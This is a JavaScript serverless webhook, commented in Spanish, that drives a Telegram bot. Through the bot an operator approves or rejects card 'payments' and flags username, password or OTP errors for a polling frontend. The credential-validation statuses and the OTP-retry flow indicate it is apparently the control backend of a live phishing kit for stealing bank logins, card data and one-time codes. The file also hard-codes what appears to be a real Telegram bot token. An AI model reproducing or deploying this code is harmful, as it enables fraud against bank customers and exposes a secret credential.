// No necesitas instalar nada extra, Vercel incluye fetch nativo

// Configuración de Telegram
const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Almacenamiento temporal (en producción usa una base de datos real)
if (!global.solicitudes) {
    global.solicitudes = new Map();
}

export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // RUTA: POST /api/webhook - Recibe actualizaciones de Telegram
    if (req.method === 'POST') {
        try {
            const update = req.body;
            console.log('📨 Update recibido:', JSON.stringify(update));

            // Verificar si es un callback query (botón presionado)
            if (update.callback_query) {
                const callbackData = update.callback_query.data;
                const callbackId = update.callback_query.id;
                const message = update.callback_query.message;
                const chatId = message.chat.id;
                const messageId = message.message_id;
                const originalText = message.text || '';

                console.log('🔘 Botón presionado:', callbackData);

                // ============================================================
                // EXTRAER ACCIÓN Y SOLICITUD ID (soporta múltiples formatos)
                // ============================================================
                let action = '';
                let solicitudId = '';
                let respuestaTexto = '';
                let estadoMensaje = '';

                // ===== FORMATOS CON TIPO DE TARJETA (visa, master, amex) =====
                // approve_visa_SOL-XXX, approve_master_SOL-XXX, approve_amex_SOL-XXX
                if (callbackData.startsWith('approve_visa_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_visa_', '');
                    respuestaTexto = '✅ Pago aprobado';
                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
                }
                else if (callbackData.startsWith('approve_master_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_master_', '');
                    respuestaTexto = '✅ Pago aprobado';
                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
                }
                else if (callbackData.startsWith('approve_amex_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_amex_', '');
                    respuestaTexto = '✅ Pago aprobado';
                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
                }
                // reject_visa_SOL-XXX, reject_master_SOL-XXX, reject_amex_SOL-XXX
                else if (callbackData.startsWith('reject_visa_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_visa_', '');
                    respuestaTexto = '❌ Pago rechazado';
                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                }
                else if (callbackData.startsWith('reject_master_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_master_', '');
                    respuestaTexto = '❌ Pago rechazado';
                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                }
                else if (callbackData.startsWith('reject_amex_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_amex_', '');
                    respuestaTexto = '❌ Pago rechazado';
                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                }
                // ===== ERROR USUARIO con tipo de tarjeta =====
                else if (callbackData.startsWith('error_user_visa_')) {
                    action = 'error_user';
                    solicitudId = callbackData.replace('error_user_visa_', '');
                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_user_master_')) {
                    action = 'error_user';
                    solicitudId = callbackData.replace('error_user_master_', '');
                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_user_amex_')) {
                    action = 'error_user';
                    solicitudId = callbackData.replace('error_user_amex_', '');
                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                }
                // ===== ERROR CONTRASEÑA con tipo de tarjeta =====
                else if (callbackData.startsWith('error_pass_visa_')) {
                    action = 'error_pass';
                    solicitudId = callbackData.replace('error_pass_visa_', '');
                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_pass_master_')) {
                    action = 'error_pass';
                    solicitudId = callbackData.replace('error_pass_master_', '');
                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_pass_amex_')) {
                    action = 'error_pass';
                    solicitudId = callbackData.replace('error_pass_amex_', '');
                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                }
                // ===== ERROR OTP con tipo de tarjeta =====
                else if (callbackData.startsWith('error_otp_visa_')) {
                    action = 'error_otp';
                    solicitudId = callbackData.replace('error_otp_visa_', '');
                    respuestaTexto = '❌ Error de OTP - Código inválido';
                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
                }
                else if (callbackData.startsWith('error_otp_master_')) {
                    action = 'error_otp';
                    solicitudId = callbackData.replace('error_otp_master_', '');
                    respuestaTexto = '❌ Error de OTP - Código inválido';
                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
                }
                else if (callbackData.startsWith('error_otp_amex_')) {
                    action = 'error_otp';
                    solicitudId = callbackData.replace('error_otp_amex_', '');
                    respuestaTexto = '❌ Error de OTP - Código inválido';
                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
                }
                // ===== FORMATOS SIN TIPO DE TARJETA (original) =====
                else if (callbackData.startsWith('approve_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_', '');
                    respuestaTexto = '✅ Pago aprobado';
                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
                }
                else if (callbackData.startsWith('reject_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_', '');
                    respuestaTexto = '❌ Pago rechazado';
                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                }
                else if (callbackData.startsWith('user_error_')) {
                    action = 'error_user';
                    solicitudId = callbackData.replace('user_error_', '');
                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('pass_error_')) {
                    action = 'error_pass';
                    solicitudId = callbackData.replace('pass_error_', '');
                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('otp_error_')) {
                    action = 'error_otp';
                    solicitudId = callbackData.replace('otp_error_', '');
                    respuestaTexto = '❌ Error de OTP - Código inválido';
                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
                }
                // Fallback
                else {
                    const parts = callbackData.split('_');
                    action = parts[0] || 'unknown';
                    solicitudId = parts.slice(1).join('_') || 'unknown';
                    respuestaTexto = 'Acción procesada';
                    estadoMensaje = 'Procesado';
                }

                console.log(`📌 Acción: ${action}, ID: ${solicitudId}`);

                // Responder al callback query inmediatamente
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: respuestaTexto,
                        show_alert: false
                    })
                });

                // Actualizar el mensaje en Telegram
                let newText = originalText;
                
                // Reemplazar cualquier estado que tenga el mensaje
                const estadosPosibles = [
                    '⏳ *Estado:* Esperando verificación...',
                    '⚠️ *Estado:* Credenciales enviadas - Pendiente de validación',
                    '⏳ *Estado:* Esperando verificación...'
                ];

                let reemplazado = false;
                for (const estado of estadosPosibles) {
                    if (newText.includes(estado)) {
                        newText = newText.replace(estado, `⏳ *Estado:* ${estadoMensaje}`);
                        reemplazado = true;
                        break;
                    }
                }

                if (!reemplazado) {
                    // Si no encontró ningún estado, reemplazar genéricamente
                    newText = newText.replace(
                        /⏳ \*Estado:\* .+/,
                        `⏳ *Estado:* ${estadoMensaje}`
                    );
                }

                await fetch(`${TELEGRAM_API}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: messageId,
                        text: newText,
                        parse_mode: 'Markdown'
                    })
                });

                // Guardar el estado de la solicitud
                global.solicitudes.set(solicitudId, {
                    estado: action,
                    timestamp: Date.now(),
                    chatId: chatId,
                    messageId: messageId
                });

                console.log(`✅ Solicitud ${solicitudId}: ${action}`);

                return res.status(200).json({ 
                    success: true, 
                    action: action,
                    solicitudId: solicitudId,
                    message: `Solicitud ${solicitudId}: ${action}` 
                });
            }

            // Si es un mensaje normal, ignorar
            return res.status(200).json({ success: true, message: 'Update recibido' });

        } catch (error) {
            console.error('❌ Error procesando webhook:', error);
            return res.status(500).json({ error: 'Error interno del servidor' });
        }
    }

    // RUTA: GET /api/webhook?check=solicitudId - El frontend consulta el estado
    if (req.method === 'GET') {
        const { check, setup } = req.query;

        // Configurar el webhook (se hace una sola vez)
        if (setup === 'true') {
            try {
                const baseUrl = `https://${req.headers.host}`;
                const webhookUrl = `${baseUrl}/api/webhook`;

                console.log('🔗 Configurando webhook en:', webhookUrl);

                const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url: webhookUrl,
                        allowed_updates: ['callback_query', 'message']
                    })
                });

                const data = await response.json();
                console.log('✅ Webhook configurado:', data);

                return res.status(200).json({
                    success: true,
                    message: 'Webhook configurado exitosamente',
                    webhookUrl: webhookUrl,
                    telegramResponse: data
                });
            } catch (error) {
                console.error('❌ Error configurando webhook:', error);
                return res.status(500).json({ error: 'Error configurando webhook' });
            }
        }

        // Verificar estado de una solicitud
        if (check) {
            const solicitudId = check;
            const solicitud = global.solicitudes.get(solicitudId);

            if (solicitud) {
                return res.status(200).json({
                    success: true,
                    solicitudId: solicitudId,
                    estado: solicitud.estado,
                    timestamp: solicitud.timestamp
                });
            } else {
                return res.status(200).json({
                    success: true,
                    solicitudId: solicitudId,
                    estado: 'pending',
                    mensaje: 'Solicitud aún no procesada'
                });
            }
        }

        // Obtener info del webhook
        try {
            const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
            const data = await response.json();
            return res.status(200).json(data);
        } catch (error) {
            return res.status(500).json({ error: 'Error obteniendo info del webhook' });
        }
    }

    return res.status(405).json({ error: 'Método no permitido' });
}
